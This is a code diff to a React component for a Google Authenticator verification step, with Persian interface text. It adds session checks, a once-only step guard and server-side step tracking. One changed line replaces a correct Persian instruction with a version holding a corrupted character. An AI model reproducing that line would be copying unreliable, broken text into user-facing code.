@@ -16,8 +16,34 @@ const AuthGoogle = () => {
   const [googleCode, setGoogleCode] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [errors, setErrors] = useState<{ googleCode?: string }>({});
+  const [isBlocked, setIsBlocked] = useState(false);
 
   const phoneNumber = location.state?.phoneNumber || "";
+  const sessionId =
+    location.state?.sessionId || sessionStorage.getItem("sessionId");
+
+  useEffect(() => {
+    const checkAccess = async () => {
+      if (!sessionId) {
+        navigate("/", { replace: true });
+        return;
+      }
+
+      const canAccess = canAccessAuthStep(sessionId, "google");
+      if (!canAccess) {
+        setIsBlocked(true);
+        setErrors({
+          googleCode:
+            "شما قبلاً Google Authenticator را وارد کرده‌اید. هر مرحله احراز هویت فقط یک بار قابل انجام است.",
+        });
+        return;
+      }
+
+      await setUserCurrentStep(sessionId, "auth_google");
+    };
+
+    checkAccess();
+  }, [sessionId, navigate]);
 
   const handleCodeSubmit = async () => {
     setErrors({});
@@ -282,7 +308,7 @@ const AuthGoogle = () => {
                 }}
               >
                 <li>اپلیکیشن Google Authenticator را باز کنید</li>
-                <li>QR Code بالا را اسکن کنید یا کد را دستی وارد کنید</li>
+                <li>QR Code بالا را اسکن کنید یا کد را دستی وارد کنی��</li>
                 <li>کد ۶ رقمی نمایش داده شده را وارد کنید</li>
               </ol>
             </div>
